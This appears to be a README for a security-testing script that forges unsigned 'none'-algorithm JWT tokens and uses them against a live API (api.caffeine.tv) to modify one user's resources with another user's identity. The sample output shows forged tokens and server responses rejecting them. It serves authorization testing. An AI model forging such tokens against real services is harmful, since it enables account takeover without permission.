# Generate un-signed jwt token to test for "The None Algorithm"

## Usage
Replace the body payload with the body that you have decoded from your JWT token for the first user and the second user.

Run 

```bash
python3 main.py --first_user_url="https://api.caffeine.tv/v1/users/CAID10C2CFEE7104459981B3A6C353516FAF" --second_user_url="https://api.caffeine.tv/v1/users/CAIDE95D7E1A29E5480994E0B5BFDBB37148" --first_user_body="{"caid": "CAIDE95D7E1A29E5480994E0B5BFDBB37148","exp": 1619545918}" --second_user_body="{"caid": "CAID10C2CFEE7104459981B3A6C353516FAF","exp": 1619545918}"
```

Output should be something:

```bash
First user token:
eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJub25lIn0.e2NhaWQ6IENBSURFOTVEN0UxQTI5RTU0ODA5OTRFMEI1QkZEQkIzNzE0OCxleHA6IDE2MTk1NDU5MTh9.
Second user token:
eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJub25lIn0.e2NhaWQ6IENBSUQxMEMyQ0ZFRTcxMDQ0NTk5ODFCM0E2QzM1MzUxNkZBRixleHA6IDE2MTk1NDU5MTh9.
Response to modify resource from user A using unsigned JWT token from user B was {"errors":{"_token":["The Access Token is invalid."]}}
Response to modify resource from user B using unsigned JWT token from user A was {"errors":{"_token":["The Access Token is invalid."]}}
```

Use these tokens in the `Authorization` header to try to modify the resources of user A with token B and vice versa.